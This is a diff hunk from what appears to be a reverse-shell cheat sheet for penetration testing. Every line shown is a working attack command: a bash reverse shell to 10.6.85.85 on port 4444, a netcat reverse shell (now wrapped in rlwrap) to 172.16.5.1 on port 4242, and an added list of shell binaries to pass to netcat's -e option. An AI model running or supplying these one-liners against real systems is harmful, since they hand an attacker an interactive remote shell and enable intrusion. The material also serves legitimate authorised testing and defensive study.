@@ -22,7 +22,12 @@ No path variable? Need absolute path
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
 nc w/ -e (traditional):  
 
-    nc -e /bin/sh 172.16.5.1 4242   
+    rlwrap nc -e /bin/sh 172.16.5.1 4242   
+    
+    -e /bin/sh 
+    -e /bin/bash
+    -e /bin/zsh
+    -e /bin/ash
     
 nc openbsd (no -e):    
 
